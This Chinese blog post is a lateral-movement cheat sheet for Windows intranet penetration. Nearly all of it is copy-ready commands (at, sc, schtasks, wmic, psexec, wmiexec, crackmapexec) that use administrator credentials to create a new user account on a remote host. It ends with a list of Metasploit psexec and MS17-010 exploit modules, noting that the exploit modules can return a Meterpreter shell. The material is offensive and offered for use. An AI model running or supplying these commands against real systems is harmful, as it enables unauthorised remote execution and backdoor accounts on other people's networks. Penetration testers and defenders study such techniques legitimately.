---
title: "Windows 常用远程执行命令的手段"
date: 2019-07-15T00:00:00+08:00
draft: false
author: "X1r0z"

tags: ['windows']
categories: ['内网渗透']

hiddenFromHomePage: false
hiddenFromSearch: false
twemoji: false
lightgallery: true
ruby: true
fraction: true
fontawesome: true
linkToMarkdown: true
rssFullText: false

toc:
  enable: true
  auto: true
code:
  copy: true
  maxShownLines: 50
math:
  enable: false
share:
  enable: true
comment:
  enable: true
---


windows 下远程执行命令的一些方法.

<!--more-->

## at

历史久远.

```
net use \\192.168.1.100\ipc$ 123456 /user:administrator
at \\192.168.1.100 12:00 net user test test /add
```

注意 `at` 后的命令无须加引号.

## sc

运行服务.

```
net use \\192.168.1.100\ipc$ 123456 /user:administrator
sc \\192.168.1.100 create test binPath= "cmd.exe /c net user test test /add"
sc \\192.168.1.100 start test
```

## schtasks

用于替代 `at`

```
schtasks /S 192.168.1.100 /U administrator /P 123456 /TN test /TR "cmd.exe /c net user test test /add" /SC ONCE /ST 12:00
```

## wmic

Windows Management Instrumentation Cli.

```
wmic /node:192.168.1.100 /user:administrator /password:123456 process call create "cmd.exe /c net user test test /add"
```

## psexec

会留日志.

```
psexec \\192.168.1.100 -u administrator -p 123456 net user test test /add
```

注意 `psexec` 后的命令无须加引号.


## wmiexec

wmic 的可回显版本.

```
cscript wmiexec.vbs /cmd 192.168.1.100 administrator 123456 "net user test test /add"
```

## crackmapexec

不仅限于远程执行命令.

```
crackmapexec 192.168.1.100 -u administrator -p 123456 -x "net user test test /add"
```

## Metasploit

Metasploit 中针对 psexec 的利用模块.

```
auxiliary/admin/smb/ms17_010_command
auxiliary/admin/smb/psexec_command
exploit/windows/smb/ms17_010_psexec
exploit/windows/smb/psexec
exploit/windows/smb/psexec_psh
```

简单说一下 auxiliary 和 exploit 的区别, 前者仅限于执行命令, 而后者可以反弹 Meterpreter 会话.